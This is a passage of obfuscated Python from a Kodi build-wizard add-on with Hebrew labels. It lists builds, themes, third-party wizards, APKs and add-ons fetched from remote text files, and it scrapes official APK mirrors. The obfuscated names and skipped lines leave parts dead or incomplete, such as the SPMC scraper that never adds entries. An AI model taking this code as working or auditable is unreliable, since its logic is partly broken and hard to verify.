	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0000OOO0OOO00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2182
	setView ('files','viewType')#line:2183
def buildMenu ():#line:2185
	if USERNAME =='':#line:2186
		ADDON .openSettings ()#line:2187
		sys .exit ()#line:2188
	if PASSWORD =='':#line:2189
		ADDON .openSettings ()#line:2190
	OOO000O0OO0OOOO0O =u_list (SPEEDFILE )#line:2191
	(OOO000O0OO0OOOO0O )#line:2192
	OO00O0OOO0O0000O0 =(wiz .workingURL (OOO000O0OO0OOOO0O ))#line:2193
	(OO00O0OOO0O0000O0 )#line:2194
	OO00O0OOO0O0000O0 =wiz .workingURL (SPEEDFILE )#line:2195
	if not OO00O0OOO0O0000O0 ==True :#line:2196
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2197
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2198
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2199
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2200
		addFile ('%s'%OO00O0OOO0O0000O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2201
	else :#line:2202
		O00000000O00000OO ,OOOOO0O0OOOOO0O00 ,OO0O00OOOOO00O0OO ,O0O00OOO00OO00OO0 ,O0000O0000000O0O0 ,OO000000O00O000O0 ,O0OOOOO0000O0O000 =wiz .buildCount ()#line:2203
		OOOOO0OOO0OO00OOO =False ;O0OO00O0O0O00OOO0 =[]#line:2204
		if THIRDPARTY =='true':#line:2205
			if not THIRD1NAME ==''and not THIRD1URL =='':OOOOO0OOO0OO00OOO =True ;O0OO00O0O0O00OOO0 .append ('1')#line:2206
			if not THIRD2NAME ==''and not THIRD2URL =='':OOOOO0OOO0OO00OOO =True ;O0OO00O0O0O00OOO0 .append ('2')#line:2207
			if not THIRD3NAME ==''and not THIRD3URL =='':OOOOO0OOO0OO00OOO =True ;O0OO00O0O0O00OOO0 .append ('3')#line:2208
		O00O000OO00OO0O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2209
		OOOOO0O00000OOO00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O000OO00OO0O0O )#line:2210
		if O00000000O00000OO ==1 and OOOOO0OOO0OO00OOO ==False :#line:2211
			for O0OOOOO000O000OO0 ,O00O00O000O0OO00O ,OO00O0O00O0O0O00O ,O0OOO0000OOOOOOO0 ,OO00OO00O000O00O0 ,O00OOOO000O0O00OO ,O0O000OO0O0O0000O ,OOO00O0O0O0O000O0 ,OOO0O0O0000OOO0O0 ,OOOOO00OO0O000OOO in OOOOO0O00000OOO00 :#line:2212
				if not SHOWADULT =='true'and OOO0O0O0000OOO0O0 .lower ()=='yes':continue #line:2213
				if not DEVELOPER =='true'and wiz .strTest (O0OOOOO000O000OO0 ):continue #line:2214
				viewBuild (OOOOO0O00000OOO00 [0 ][0 ])#line:2215
				return #line:2216
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2219
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2220
		if OOOOO0OOO0OO00OOO ==True :#line:2221
			for O0O0O00O0OO0000OO in O0OO00O0O0O00OOO0 :#line:2222
				O0OOOOO000O000OO0 =eval ('THIRD%sNAME'%O0O0O00O0OO0000OO )#line:2223
		if len (OOOOO0O00000OOO00 )>=1 :#line:2225
			if SEPERATE =='true':#line:2226
				for O0OOOOO000O000OO0 ,O00O00O000O0OO00O ,OO00O0O00O0O0O00O ,O0OOO0000OOOOOOO0 ,OO00OO00O000O00O0 ,O00OOOO000O0O00OO ,O0O000OO0O0O0000O ,OOO00O0O0O0O000O0 ,OOO0O0O0000OOO0O0 ,OOOOO00OO0O000OOO in OOOOO0O00000OOO00 :#line:2227
					if not SHOWADULT =='true'and OOO0O0O0000OOO0O0 .lower ()=='yes':continue #line:2228
					if not DEVELOPER =='true'and wiz .strTest (O0OOOOO000O000OO0 ):continue #line:2229
					OOO00OO000000OOOO =createMenu ('install','',O0OOOOO000O000OO0 )#line:2230
					addDir ('[%s] %s (v%s)'%(float (OO00OO00O000O00O0 ),O0OOOOO000O000OO0 ,O00O00O000O0OO00O ),'viewbuild',O0OOOOO000O000OO0 ,description =OOOOO00OO0O000OOO ,fanart =OOO00O0O0O0O000O0 ,icon =O0O000OO0O0O0000O ,menu =OOO00OO000000OOOO ,themeit =THEME2 )#line:2231
			else :#line:2232
				if O0O00OOO00OO00OO0 >0 :#line:2233
					OO00OO000O0O00O0O ='+'if SHOW17 =='false'else '-'#line:2234
					if SHOW17 =='true':#line:2236
						for O0OOOOO000O000OO0 ,O00O00O000O0OO00O ,OO00O0O00O0O0O00O ,O0OOO0000OOOOOOO0 ,OO00OO00O000O00O0 ,O00OOOO000O0O00OO ,O0O000OO0O0O0000O ,OOO00O0O0O0O000O0 ,OOO0O0O0000OOO0O0 ,OOOOO00OO0O000OOO in OOOOO0O00000OOO00 :#line:2238
							if not SHOWADULT =='true'and OOO0O0O0000OOO0O0 .lower ()=='yes':continue #line:2239
							if not DEVELOPER =='true'and wiz .strTest (O0OOOOO000O000OO0 ):continue #line:2240
							O00OOO00O0O00000O =int (float (OO00OO00O000O00O0 ))#line:2241
							if O00OOO00O0O00000O ==17 :#line:2242
								OOO00OO000000OOOO =createMenu ('install','',O0OOOOO000O000OO0 )#line:2243
								addDir ('[%s] %s (v%s)'%(float (OO00OO00O000O00O0 ),O0OOOOO000O000OO0 ,O00O00O000O0OO00O ),'viewbuild',O0OOOOO000O000OO0 ,description =OOOOO00OO0O000OOO ,fanart =OOO00O0O0O0O000O0 ,icon =O0O000OO0O0O0000O ,menu =OOO00OO000000OOOO ,themeit =THEME2 )#line:2244
				if O0000O0000000O0O0 >0 :#line:2245
					OO00OO000O0O00O0O ='+'if SHOW18 =='false'else '-'#line:2246
					if SHOW18 =='true':#line:2248
						for O0OOOOO000O000OO0 ,O00O00O000O0OO00O ,OO00O0O00O0O0O00O ,O0OOO0000OOOOOOO0 ,OO00OO00O000O00O0 ,O00OOOO000O0O00OO ,O0O000OO0O0O0000O ,OOO00O0O0O0O000O0 ,OOO0O0O0000OOO0O0 ,OOOOO00OO0O000OOO in OOOOO0O00000OOO00 :#line:2250
							if not SHOWADULT =='true'and OOO0O0O0000OOO0O0 .lower ()=='yes':continue #line:2251
							if not DEVELOPER =='true'and wiz .strTest (O0OOOOO000O000OO0 ):continue #line:2252
							O00OOO00O0O00000O =int (float (OO00OO00O000O00O0 ))#line:2253
							if O00OOO00O0O00000O ==18 :#line:2254
								OOO00OO000000OOOO =createMenu ('install','',O0OOOOO000O000OO0 )#line:2255
								addDir ('[%s] %s (v%s)'%(float (OO00OO00O000O00O0 ),O0OOOOO000O000OO0 ,O00O00O000O0OO00O ),'viewbuild',O0OOOOO000O000OO0 ,description =OOOOO00OO0O000OOO ,fanart =OOO00O0O0O0O000O0 ,icon =O0O000OO0O0O0000O ,menu =OOO00OO000000OOOO ,themeit =THEME2 )#line:2256
				if OO0O00OOOOO00O0OO >0 :#line:2257
					OO00OO000O0O00O0O ='+'if SHOW16 =='false'else '-'#line:2258
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO00OO000O0O00O0O ,OO0O00OOOOO00O0OO ),'togglesetting','show16',themeit =THEME3 )#line:2259
					if SHOW16 =='true':#line:2260
						for O0OOOOO000O000OO0 ,O00O00O000O0OO00O ,OO00O0O00O0O0O00O ,O0OOO0000OOOOOOO0 ,OO00OO00O000O00O0 ,O00OOOO000O0O00OO ,O0O000OO0O0O0000O ,OOO00O0O0O0O000O0 ,OOO0O0O0000OOO0O0 ,OOOOO00OO0O000OOO in OOOOO0O00000OOO00 :#line:2261
							if not SHOWADULT =='true'and OOO0O0O0000OOO0O0 .lower ()=='yes':continue #line:2262
							if not DEVELOPER =='true'and wiz .strTest (O0OOOOO000O000OO0 ):continue #line:2263
							O00OOO00O0O00000O =int (float (OO00OO00O000O00O0 ))#line:2264
							if O00OOO00O0O00000O ==16 :#line:2265
								OOO00OO000000OOOO =createMenu ('install','',O0OOOOO000O000OO0 )#line:2266
								addDir ('[%s] %s (v%s)'%(float (OO00OO00O000O00O0 ),O0OOOOO000O000OO0 ,O00O00O000O0OO00O ),'viewbuild',O0OOOOO000O000OO0 ,description =OOOOO00OO0O000OOO ,fanart =OOO00O0O0O0O000O0 ,icon =O0O000OO0O0O0000O ,menu =OOO00OO000000OOOO ,themeit =THEME2 )#line:2267
				if OOOOO0O0OOOOO0O00 >0 :#line:2268
					OO00OO000O0O00O0O ='+'if SHOW15 =='false'else '-'#line:2269
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO00OO000O0O00O0O ,OOOOO0O0OOOOO0O00 ),'togglesetting','show15',themeit =THEME3 )#line:2270
					if SHOW15 =='true':#line:2271
						for O0OOOOO000O000OO0 ,O00O00O000O0OO00O ,OO00O0O00O0O0O00O ,O0OOO0000OOOOOOO0 ,OO00OO00O000O00O0 ,O00OOOO000O0O00OO ,O0O000OO0O0O0000O ,OOO00O0O0O0O000O0 ,OOO0O0O0000OOO0O0 ,OOOOO00OO0O000OOO in OOOOO0O00000OOO00 :#line:2272
							if not SHOWADULT =='true'and OOO0O0O0000OOO0O0 .lower ()=='yes':continue #line:2273
							if not DEVELOPER =='true'and wiz .strTest (O0OOOOO000O000OO0 ):continue #line:2274
							O00OOO00O0O00000O =int (float (OO00OO00O000O00O0 ))#line:2275
							if O00OOO00O0O00000O <=15 :#line:2276
								OOO00OO000000OOOO =createMenu ('install','',O0OOOOO000O000OO0 )#line:2277
								addDir ('[%s] %s (v%s)'%(float (OO00OO00O000O00O0 ),O0OOOOO000O000OO0 ,O00O00O000O0OO00O ),'viewbuild',O0OOOOO000O000OO0 ,description =OOOOO00OO0O000OOO ,fanart =OOO00O0O0O0O000O0 ,icon =O0O000OO0O0O0000O ,menu =OOO00OO000000OOOO ,themeit =THEME2 )#line:2278
		elif O0OOOOO0000O0O000 >0 :#line:2279
			if OO000000O00O000O0 >0 :#line:2280
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2281
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2282
			else :#line:2283
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2284
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2285
	setView ('files','viewType')#line:2286
def viewBuild (OO00OOO00OOOOO0OO ):#line:2288
	O00000O0O0O00O0O0 =wiz .workingURL (SPEEDFILE )#line:2289
	if not O00000O0O0O00O0O0 ==True :#line:2290
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2291
		addFile ('%s'%O00000O0O0O00O0O0 ,'',themeit =THEME3 )#line:2292
		return #line:2293
	if wiz .checkBuild (OO00OOO00OOOOO0OO ,'version')==False :#line:2294
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2295
		addFile ('%s was not found in the builds list.'%OO00OOO00OOOOO0OO ,'',themeit =THEME3 )#line:2296
		return #line:2297
	O00OOO00000OO000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2298
	O0OOO00O00000O00O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00OOO00OOOOO0OO ).findall (O00OOO00000OO000O )#line:2299
	for O0OOOO00OO0O000O0 ,OOOOO000000OOOO00 ,OO00O0OO00O0OOOO0 ,O0O0O00000O0OOOO0 ,OO000O0OO00OOO0O0 ,OOOO0OOOOOOO0OO0O ,O00O0000OOO0OOO0O ,O000OO0OOOO0OOOO0 ,OOOO000OO0000OOOO ,OO0O0O00O0OOO000O in O0OOO00O00000O00O :#line:2300
		OOOO0OOOOOOO0OO0O =OOOO0OOOOOOO0OO0O if wiz .workingURL (OOOO0OOOOOOO0OO0O )else ICON #line:2301
		O00O0000OOO0OOO0O =O00O0000OOO0OOO0O if wiz .workingURL (O00O0000OOO0OOO0O )else FANART #line:2302
		OO0O0OO00O00OOOO0 ='%s (v%s)'%(OO00OOO00OOOOO0OO ,O0OOOO00OO0O000O0 )#line:2303
		if BUILDNAME ==OO00OOO00OOOOO0OO and O0OOOO00OO0O000O0 >BUILDVERSION :#line:2304
			OO0O0OO00O00OOOO0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0O0OO00O00OOOO0 ,BUILDVERSION )#line:2305
		OOOO00OOO0OOOOO0O =int (float (KODIV ));OOOOOO000OO0O0OOO =int (float (O0O0O00000O0OOOO0 ))#line:2314
		if not OOOO00OOO0OOOOO0O ==OOOOOO000OO0O0OOO :#line:2315
			if OOOO00OOO0OOOOO0O ==16 and OOOOOO000OO0O0OOO <=15 :O0000O0OOOO00O000 =False #line:2316
			else :O0000O0OOOO00O000 =True #line:2317
		else :O0000O0OOOO00O000 =False #line:2318
		addFile ('התקנה','install',OO00OOO00OOOOO0OO ,'fresh',description =OO0O0O00O0OOO000O ,fanart =O00O0000OOO0OOO0O ,icon =OOOO0OOOOOOO0OO0O ,themeit =THEME1 )#line:2322
		if not OO000O0OO00OOO0O0 =='http://':#line:2325
			if wiz .workingURL (OO000O0OO00OOO0O0 )==True :#line:2326
				addFile (wiz .sep ('THEMES'),'',fanart =O00O0000OOO0OOO0O ,icon =OOOO0OOOOOOO0OO0O ,themeit =THEME3 )#line:2327
				O00OOO00000OO000O =wiz .openURL (OO000O0OO00OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2328
				O0OOO00O00000O00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OOO00000OO000O )#line:2329
				for O0O0OO0OOOO00O0O0 ,OO000O00OO0O00O00 ,O0O0O00OO0O00OO00 ,OO00O0OOOO0OOOOOO ,O0O00O0OOO0O0000O ,OO0O0O00O0OOO000O in O0OOO00O00000O00O :#line:2330
					if not SHOWADULT =='true'and O0O00O0OOO0O0000O .lower ()=='yes':continue #line:2331
					O0O0O00OO0O00OO00 =O0O0O00OO0O00OO00 if O0O0O00OO0O00OO00 =='http://'else OOOO0OOOOOOO0OO0O #line:2332
					OO00O0OOOO0OOOOOO =OO00O0OOOO0OOOOOO if OO00O0OOOO0OOOOOO =='http://'else O00O0000OOO0OOO0O #line:2333
					addFile (O0O0OO0OOOO00O0O0 if not O0O0OO0OOOO00O0O0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0O0OO0OOOO00O0O0 ,'theme',OO00OOO00OOOOO0OO ,O0O0OO0OOOO00O0O0 ,description =OO0O0O00O0OOO000O ,fanart =OO00O0OOOO0OOOOOO ,icon =O0O0O00OO0O00OO00 ,themeit =THEME3 )#line:2334
	setView ('files','viewType')#line:2335
def viewThirdList (OOO00OOOO000O00OO ):#line:2337
	O00OOO00OO0OO00OO =eval ('THIRD%sNAME'%OOO00OOOO000O00OO )#line:2338
	O00OO0O0O0O0O0O0O =eval ('THIRD%sURL'%OOO00OOOO000O00OO )#line:2339
	OOOOO00O0OOOO000O =wiz .workingURL (O00OO0O0O0O0O0O0O )#line:2340
	if not OOOOO00O0OOOO000O ==True :#line:2341
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2342
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2343
	else :#line:2344
		OO0O000OOOOOO0OOO ,OOOO00OO0000O00O0 =wiz .thirdParty (O00OO0O0O0O0O0O0O )#line:2345
		addFile ("[B]%s[/B]"%O00OOO00OO0OO00OO ,'',themeit =THEME3 )#line:2346
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2347
		if OO0O000OOOOOO0OOO :#line:2348
			for O00OOO00OO0OO00OO ,OOO00O00O0O00O0O0 ,O00OO0O0O0O0O0O0O ,O0O000O0O0OOO0OOO ,O0OOO0000O00OO000 ,OOOO000O000000O0O ,OOO00OOO000O00O0O ,OO00OOOOOOOO0O0O0 in OOOO00OO0000O00O0 :#line:2349
				if not SHOWADULT =='true'and OOO00OOO000O00O0O .lower ()=='yes':continue #line:2350
				addFile ("[%s] %s v%s"%(O0O000O0O0OOO0OOO ,O00OOO00OO0OO00OO ,OOO00O00O0O00O0O0 ),'installthird',O00OOO00OO0OO00OO ,O00OO0O0O0O0O0O0O ,icon =O0OOO0000O00OO000 ,fanart =OOOO000O000000O0O ,description =OO00OOOOOOOO0O0O0 ,themeit =THEME2 )#line:2351
		else :#line:2352
			for O00OOO00OO0OO00OO ,O00OO0O0O0O0O0O0O ,O0OOO0000O00OO000 ,OOOO000O000000O0O ,OO00OOOOOOOO0O0O0 in OOOO00OO0000O00O0 :#line:2353
				addFile (O00OOO00OO0OO00OO ,'installthird',O00OOO00OO0OO00OO ,O00OO0O0O0O0O0O0O ,icon =O0OOO0000O00OO000 ,fanart =OOOO000O000000O0O ,description =OO00OOOOOOOO0O0O0 ,themeit =THEME2 )#line:2354
def editThirdParty (OOO0OOOOO0OOO0O00 ):#line:2356
	O0O0O0O00O0OOOOO0 =eval ('THIRD%sNAME'%OOO0OOOOO0OOO0O00 )#line:2357
	O00O000O0O00OOOOO =eval ('THIRD%sURL'%OOO0OOOOO0OOO0O00 )#line:2358
	OOO000O0O00O00OO0 =wiz .getKeyboard (O0O0O0O00O0OOOOO0 ,'Enter the Name of the Wizard')#line:2359
	O0OO0OOOO0OO0OO0O =wiz .getKeyboard (O00O000O0O00OOOOO ,'Enter the URL of the Wizard Text')#line:2360
	wiz .setS ('wizard%sname'%OOO0OOOOO0OOO0O00 ,OOO000O0O00O00OO0 )#line:2362
	wiz .setS ('wizard%surl'%OOO0OOOOO0OOO0O00 ,O0OO0OOOO0OO0OO0O )#line:2363
def apkScraper (name =""):#line:2365
	if name =='kodi':#line:2366
		OO00O0OO000OOO0O0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2367
		OOO000OOO00O00OO0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2368
		OO0OO0O00O0O00O00 =wiz .openURL (OO00O0OO000OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2369
		OOO0OOO0OOOO000OO =wiz .openURL (OOO000OOO00O00OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2370
		O000OO0O00OOOOO0O =0 #line:2371
		OOOO000OOOOOOOO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OO0O00O0O00O00 )#line:2372
		O0O00OO0O0O0O00O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO0OOO0OOOO000OO )#line:2373
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2375
		O0O0O00OO00O0000O =False #line:2376
		for OO00O0O0O0O00OO0O ,name ,O00OO0OO0OO00O0O0 ,OO00O00O00O0OOO00 in OOOO000OOOOOOOO00 :#line:2377
			if OO00O0O0O0O00OO0O in ['../','old/']:continue #line:2378
			if not OO00O0O0O0O00OO0O .endswith ('.apk'):continue #line:2379
			if not OO00O0O0O0O00OO0O .find ('_')==-1 and O0O0O00OO00O0000O ==True :continue #line:2380
			try :#line:2381
				OOOO00OO000OO00OO =name .split ('-')#line:2382
				if not OO00O0O0O0O00OO0O .find ('_')==-1 :#line:2383
					O0O0O00OO00O0000O =True #line:2384
					O0O0OOO00O0O0OOOO ,O0OO0OOO000O00O00 =OOOO00OO000OO00OO [2 ].split ('_')#line:2385
				else :#line:2386
					O0O0OOO00O0O0OOOO =OOOO00OO000OO00OO [2 ]#line:2387
					O0OO0OOO000O00O00 =''#line:2388
				O00000O0O0O0OO0OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OO000OO00OO [0 ].title (),OOOO00OO000OO00OO [1 ],O0OO0OOO000O00O00 .upper (),O0O0OOO00O0O0OOOO ,COLOR2 ,O00OO0OO0OO00O0O0 .replace (' ',''),COLOR1 ,OO00O00O00O0OOO00 )#line:2389
				OO0O00OO0OO0OO0OO =urljoin (OO00O0OO000OOO0O0 ,OO00O0O0O0O00OO0O )#line:2390
				addFile (O00000O0O0O0OO0OO ,'apkinstall',"%s v%s%s %s"%(OOOO00OO000OO00OO [0 ].title (),OOOO00OO000OO00OO [1 ],O0OO0OOO000O00O00 .upper (),O0O0OOO00O0O0OOOO ),OO0O00OO0OO0OO0OO )#line:2391
				O000OO0O00OOOOO0O +=1 #line:2392
			except :#line:2393
				wiz .log ("Error on: %s"%name )#line:2394
		for OO00O0O0O0O00OO0O ,name ,O00OO0OO0OO00O0O0 ,OO00O00O00O0OOO00 in O0O00OO0O0O0O00O0 :#line:2396
			if OO00O0O0O0O00OO0O in ['../','old/']:continue #line:2397
			if not OO00O0O0O0O00OO0O .endswith ('.apk'):continue #line:2398
			if not OO00O0O0O0O00OO0O .find ('_')==-1 :continue #line:2399
			try :#line:2400
				OOOO00OO000OO00OO =name .split ('-')#line:2401
				O00000O0O0O0OO0OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00OO000OO00OO [0 ].title (),OOOO00OO000OO00OO [1 ],OOOO00OO000OO00OO [2 ],COLOR2 ,O00OO0OO0OO00O0O0 .replace (' ',''),COLOR1 ,OO00O00O00O0OOO00 )#line:2402
				OO0O00OO0OO0OO0OO =urljoin (OOO000OOO00O00OO0 ,OO00O0O0O0O00OO0O )#line:2403
				addFile (O00000O0O0O0OO0OO ,'apkinstall',"%s v%s %s"%(OOOO00OO000OO00OO [0 ].title (),OOOO00OO000OO00OO [1 ],OOOO00OO000OO00OO [2 ]),OO0O00OO0OO0OO0OO )#line:2404
				O000OO0O00OOOOO0O +=1 #line:2405
			except :#line:2406
				wiz .log ("Error on: %s"%name )#line:2407
		if O000OO0O00OOOOO0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2408
	elif name =='spmc':#line:2409
		OO0000000OO0O0OOO ='https://github.com/koying/SPMC/releases'#line:2410
		OO0OO0O00O0O00O00 =wiz .openURL (OO0000000OO0O0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2411
		O000OO0O00OOOOO0O =0 #line:2412
		OOOO000OOOOOOOO00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0OO0O00O0O00O00 )#line:2413
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2415
		for name ,O000O0O000000OOO0 in OOOO000OOOOOOOO00 :#line:2417
			OOO00O0000OOO0O0O =''#line:2418
			O0O00OO0O0O0O00O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O000O0O000000OOO0 )#line:2419
			for O00O0O00O00OOO0OO ,OO00O0000O0OO00OO ,O0OO00OO0O00OO0O0 in O0O00OO0O0O0O00O0 :#line:2420
				if O0OO00OO0O00OO0O0 .find ('armeabi')==-1 :continue #line:2421
				if O0OO00OO0O00OO0O0 .find ('launcher')>-1 :continue #line:2422
				OOO00O0000OOO0O0O =urljoin ('https://github.com',O00O0O00O00OOO0OO )#line:2423
				break #line:2424
		if O000OO0O00OOOOO0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2426
def apkMenu (url =None ):#line:2428
	if url ==None :#line:2429
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2432
	if not APKFILE =='http://':#line:2433
		if url ==None :#line:2434
			O00OOO0O0000000O0 =wiz .workingURL (APKFILE )#line:2435
			O000O0000000OOO00 =uservar .APKFILE #line:2436
		else :#line:2437
			O00OOO0O0000000O0 =wiz .workingURL (url )#line:2438
			O000O0000000OOO00 =url #line:2439
		if O00OOO0O0000000O0 ==True :#line:2440
			O0000O0OOO00OOOO0 =wiz .openURL (O000O0000000OOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2441
			OO0OOO0OO0O0O000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000O0OOO00OOOO0 )#line:2442
			if len (OO0OOO0OO0O0O000O )>0 :#line:2443
				OO0O0OOOO000OO0OO =0 #line:2444
				for O00O0OOOO000OO0OO ,O00OO00OO0O0OO0O0 ,url ,O0O0OOOOO00O000OO ,O0OOO000000O0OO00 ,O0OO0O0OOOOO0OOOO ,O0000000OOO00000O in OO0OOO0OO0O0O000O :#line:2445
					if not SHOWADULT =='true'and O0OO0O0OOOOO0OOOO .lower ()=='yes':continue #line:2446
					if O00OO00OO0O0OO0O0 .lower ()=='yes':#line:2447
						OO0O0OOOO000OO0OO +=1 #line:2448
						addDir ("[B]%s[/B]"%O00O0OOOO000OO0OO ,'apk',url ,description =O0000000OOO00000O ,icon =O0O0OOOOO00O000OO ,fanart =O0OOO000000O0OO00 ,themeit =THEME3 )#line:2449
					else :#line:2450
						OO0O0OOOO000OO0OO +=1 #line:2451
						addFile (O00O0OOOO000OO0OO ,'apkinstall',O00O0OOOO000OO0OO ,url ,description =O0000000OOO00000O ,icon =O0O0OOOOO00O000OO ,fanart =O0OOO000000O0OO00 ,themeit =THEME2 )#line:2452
					if OO0O0OOOO000OO0OO <1 :#line:2453
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2454
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2455
		else :#line:2456
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2457
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2458
			addFile ('%s'%O00OOO0O0000000O0 ,'',themeit =THEME3 )#line:2459
		return #line:2460
	else :wiz .log ("[APK Menu] No APK list added.")#line:2461
	setView ('files','viewType')#line:2462
def addonMenu (url =None ):#line:2464
	if not ADDONFILE =='http://':#line:2465
		if url ==None :#line:2466
			O00OO0O000OO0O0O0 =wiz .workingURL (ADDONFILE )#line:2467
			OO000OO0O0OOO00OO =uservar .ADDONFILE #line:2468
		else :#line:2469
			O00OO0O000OO0O0O0 =wiz .workingURL (url )#line:2470
			OO000OO0O0OOO00OO =url #line:2471
		if O00OO0O000OO0O0O0 ==True :#line:2472
			OOO000O0OO0O00O0O =wiz .openURL (OO000OO0O0OOO00OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2473
			OOO000OO000O00OO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO000O0OO0O00O0O )#line:2474
			if len (OOO000OO000O00OO0 )>0 :#line:2475
				O00O0OO0O0OOOO0O0 =0 #line:2476
				for O0OO000OOOO00O0OO ,OOOO0O0O0OO0OO0OO ,url ,O00O0OO00O0OO00O0 ,O00OO00OO0000000O ,OOO00O0O00OOO00OO ,OO00000OOOOO0OOO0 ,OO0O0O00OO00OO0OO ,OOOOOO0000O00OOOO ,OOO0OO0O0OOOO0OOO in OOO000OO000O00OO0 :#line:2477
					if OOOO0O0O0OO0OO0OO .lower ()=='section':#line:2478
						O00O0OO0O0OOOO0O0 +=1 #line:2479
						addDir ("[B]%s[/B]"%O0OO000OOOO00O0OO ,'addons',url ,description =OOO0OO0O0OOOO0OOO ,icon =OO00000OOOOO0OOO0 ,fanart =OO0O0O00OO00OO0OO ,themeit =THEME3 )#line:2480
					else :#line:2481
						if not SHOWADULT =='true'and OOOOOO0000O00OOOO .lower ()=='yes':continue #line:2482
						try :#line:2483
							OOOOOO00OO0O0OO00 =xbmcaddon .Addon (id =OOOO0O0O0OO0OO0OO ).getAddonInfo ('path')#line:2484
							if os .path .exists (OOOOOO00OO0O0OO00 ):#line:2485
								O0OO000OOOO00O0OO ="[COLOR green][Installed][/COLOR] %s"%O0OO000OOOO00O0OO #line:2486
						except :#line:2487
							pass #line:2488
						O00O0OO0O0OOOO0O0 +=1 #line:2489
						addFile (O0OO000OOOO00O0OO ,'addoninstall',OOOO0O0O0OO0OO0OO ,OO000OO0O0OOO00OO ,description =OOO0OO0O0OOOO0OOO ,icon =OO00000OOOOO0OOO0 ,fanart =OO0O0O00OO00OO0OO ,themeit =THEME2 )#line:2490
